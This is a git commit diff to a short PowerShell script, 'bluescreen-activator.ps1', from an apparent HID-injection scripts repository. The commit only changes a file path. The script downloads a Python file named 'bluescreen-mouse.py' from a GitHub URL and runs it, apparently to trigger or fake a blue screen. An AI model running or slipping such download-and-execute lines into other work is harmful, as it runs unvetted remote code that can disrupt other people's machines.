90eed327f71df56be4f8d1a4aa403373a0e4f8c9
Simen <97337442+simen64@users.noreply.github.com>
2024-03-14 23:13:27 +0100

    Update bluescreen-activator.ps1

--- Bluescreen-mouse/bluescreen-activator.ps1
+++ Bluescreen-mouse/bluescreen-activator.ps1
@@ -1,3 +1,3 @@
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/simen64/Simons-HID-Scripts/main/Bluescreen-mouse/bluescreen-mouse.py" -OutFile C:\blue.py
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/simen64/Simons-HID-Scripts/main/Bluescreen-mouse/bluescreen-mouse.py" -OutFile blue.py
 
-python.exe C:\blue.py
+python.exe blue.py
